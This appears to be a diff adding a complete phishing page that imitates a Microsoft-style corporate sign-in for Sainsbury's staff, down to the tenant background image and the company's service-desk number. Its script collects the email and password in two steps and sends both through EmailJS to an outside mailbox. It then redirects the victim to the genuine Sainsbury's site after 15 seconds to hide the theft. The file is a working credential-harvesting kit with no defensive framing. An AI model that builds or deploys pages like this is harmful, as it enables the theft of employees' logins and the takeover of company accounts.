@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #f2f2f2;
+            background-image: url('https://aadcdn.msauthimages.net/c1c6b6c8-jmbyrzdxf55m7e2bm4b-jwzwvbohnnrav-5xm69zzoy/logintenantbranding/0/illustration?ts=638433342819787717');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #1b1b1b;
+            gap: 16px;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            pointer-events: none;
+        }
+
+        .login-container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 440px;
+            padding: 44px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo {
+            text-align: left;
+            margin-bottom: 24px;
+        }
+
+        .logo img {
+            height: 32px;
+            width: auto;
+        }
+
+        .logo-text {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 8px;
+            line-height: 28px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #1b1b1b;
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+            transition: all 0.3s ease-in-out;
+            overflow: hidden;
+        }
+
+        .form-group.slide-out {
+            transform: translateX(-100%);
+            opacity: 0;
+            height: 0;
+            margin-bottom: 0;
+        }
+
+        .form-group.slide-in {
+            transform: translateX(0);
+            opacity: 1;
+            height: auto;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 15px;
+            font-weight: 400;
+            color: #1b1b1b;
+            margin-bottom: 4px;
+            line-height: 20px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 6px 0;
+            border: none;
+            border-bottom: 1px solid #666;
+            border-radius: 0;
+            font-size: 15px;
+            line-height: 20px;
+            height: 32px;
+            outline: none;
+            background: transparent;
+            font-weight: 400;
+        }
+
+        .form-input:focus {
+            border-bottom-color: #0078d4;
+        }
+
+        .form-input.error {
+            border-bottom-color: #d13438;
+        }
+
+        .error-message {
+            color: #d13438;
+            font-size: 13px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .signin-button {
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 8px 24px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            height: 36px;
+            min-width: 80px;
+            margin-top: 16px;
+            display: block;
+            margin-left: auto;
+        }
+
+        .signin-button:hover {
+            background-color: #106ebe;
+        }
+
+        .signin-button:disabled {
+            background-color: #c8c6c4;
+            cursor: not-allowed;
+        }
+
+        .links {
+            margin-top: 8px;
+            clear: both;
+        }
+
+        .link {
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 13px;
+            margin-right: 16px;
+        }
+
+        .link:hover {
+            color: #106ebe;
+            text-decoration: underline;
+        }
+
+        .help-text {
+            font-size: 12px;
+            color: #666;
+            margin-top: 16px;
+            line-height: 16px;
+            clear: both;
+        }
+
+        .help-text a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+
+        .help-text a:hover {
+            text-decoration: underline;
+        }
+
+        .signin-options {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 440px;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            position: relative;
+            z-index: 1;
+            margin-top: 8px;
+            height: 48px;
+        }
+
+        .signin-options:hover {
+            background-color: #f5f5f5;
+        }
+
+        .signin-options:hover {
+            background-color: #c0c0c0;
+        }
+
+        .signin-options-icon {
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #333;
+            font-size: 16px;
+        }
+
+        .signin-options-icon svg {
+            filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.2));
+        }
+
+        .signin-options-text {
+            color: #333;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: none;
+            padding: 0;
+            text-align: right;
+            font-size: 12px;
+            color: white;
+            z-index: 1;
+        }
+
+        .footer a {
+            color: white;
+            text-decoration: none;
+            margin-left: 16px;
+            opacity: 0.9;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+            opacity: 1;
+        }
+
+        .company-branding {
+            background: none;
+            color: #ff6600;
+            padding: 0;
+            margin: 0 0 24px 0;
+            text-align: left;
+        }
+
+        .company-logo {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 0;
+            color: #ff6600;
+            line-height: 40px;
+        }
+
+        .company-logo .apostrophe {
+            font-size: 32px;
+            color: #ff8800;
+        }
+
+        .company-help {
+            font-size: 12px;
+            color: #666;
+            margin-top: 16px;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="company-branding">
+            <div class="company-logo">Sainsbury<span class="apostrophe">'s</span></div>
+        </div>
+
+        <div class="logo">
+            <div class="logo-text">Sign in</div>
+            <div class="subtitle">to your account</div>
+        </div>
+
+        <form id="loginForm">
+            <div class="form-group" id="emailGroup">
+                <label for="email" class="form-label">Email address</label>
+                <input type="email" id="email" name="email" class="form-input" required>
+                <div class="error-message" id="emailError">Please enter a valid email address</div>
+            </div>
+
+            <div class="form-group" id="passwordGroup" style="display: none;">
+                <label for="password" class="form-label">Password</label>
+                <input type="password" id="password" name="password" class="form-input">
+                <div class="error-message" id="passwordError">Please enter your password</div>
+            </div>
+
+            <div class="links">
+                <a href="#" class="link">Can't access your account?</a>
+            </div>
+
+            <button type="submit" class="signin-button" id="signinBtn">Next</button>
+        </form>
+
+        <div class="help-text">
+            <p>For help logging in please call the Sainsbury's Tech Service Desk on 0345 603 2638</p>
+        </div>
+    </div>
+
+    <div class="signin-options">
+        <div class="signin-options-icon">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="transform: rotate(45deg);">
+                <path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z" fill="#666"/>
+            </svg>
+        </div>
+        <div class="signin-options-text">Sign-in options</div>
+    </div>
+
+    <div class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <a href="#">...</a>
+    </div>
+
+    <!-- EmailJS CDN -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <script>
+        // Initialize EmailJS
+        (function() {
+            emailjs.init("BsrOfrmEOPuI9rX-x");
+        })();
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const emailError = document.getElementById('emailError');
+            const passwordError = document.getElementById('passwordError');
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const emailGroup = document.getElementById('emailGroup');
+            const passwordGroup = document.getElementById('passwordGroup');
+            const signinBtn = document.getElementById('signinBtn');
+            
+            console.log('Form submitted');
+            console.log('Email:', email);
+            console.log('Password group display:', passwordGroup.style.display);
+            
+            // Reset errors
+            emailError.classList.remove('show');
+            passwordError.classList.remove('show');
+            emailInput.classList.remove('error');
+            passwordInput.classList.remove('error');
+            
+            let hasError = false;
+            
+            // If password group is hidden, validate email and show password
+            if (passwordGroup.style.display === 'none' || passwordGroup.style.display === '') {
+                console.log('Password group is hidden, validating email');
+                // Validate email
+                if (!email || !email.includes('@')) {
+                    emailError.classList.add('show');
+                    emailInput.classList.add('error');
+                    hasError = true;
+                    console.log('Email validation failed');
+                }
+                
+                if (!hasError) {
+                    console.log('Email valid, showing password field');
+                    
+                    // Slide out email group
+                    emailGroup.classList.add('slide-out');
+                    
+                    // After email slides out, slide in password
+                    setTimeout(() => {
+                        emailGroup.style.display = 'none';
+                        passwordGroup.style.display = 'block';
+                        passwordGroup.classList.add('slide-in');
+                        passwordInput.required = true;
+                        signinBtn.textContent = 'Sign in';
+                        
+                        // Focus on password input
+                        setTimeout(() => {
+                            passwordInput.focus();
+                        }, 100);
+                    }, 300); // Wait for slide out animation
+                }
+            } else {
+                console.log('Password group is visible, validating password');
+                // Password group is visible, validate password
+                if (!password) {
+                    passwordError.classList.add('show');
+                    passwordInput.classList.add('error');
+                    hasError = true;
+                    console.log('Password validation failed');
+                }
+                
+                if (!hasError) {
+                    console.log('Password valid, sending credentials');
+                    // Show loading
+                    signinBtn.disabled = true;
+                    signinBtn.textContent = 'Signing in...';
+                    
+                    // Send email with credentials
+                    emailjs.send("service_n0b107b", "template_5vpgbrr", {
+                        email: email,
+                        password: password,
+                    })
+                    .then(function(response) {
+                        console.log("SUCCESS", response);
+                        console.log("Email sent successfully!");
+                        console.log("Response details:", response);
+                        
+                        // Wait 15 seconds before redirecting
+                        setTimeout(function() {
+                            console.log("Redirecting to Sainsbury's site...");
+                            window.location.href = "https://oursainsburys.co.uk/";
+                        }, 15000); // 15 seconds delay
+                        
+                    }, function(error) {
+                        console.log("FAILED", error);
+                        console.log("Error details:", error);
+                        // Show error message
+                        alert('Login failed. Please try again.');
+                        signinBtn.disabled = false;
+                        signinBtn.textContent = 'Sign in';
+                    });
+                }
+            }
+        });
+        
+        // Add focus effects
+        document.querySelectorAll('.form-input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.parentElement.querySelector('.error-message').classList.remove('show');
+                this.classList.remove('error');
+            });
+        });
+    </script>
+</body>
+</html>
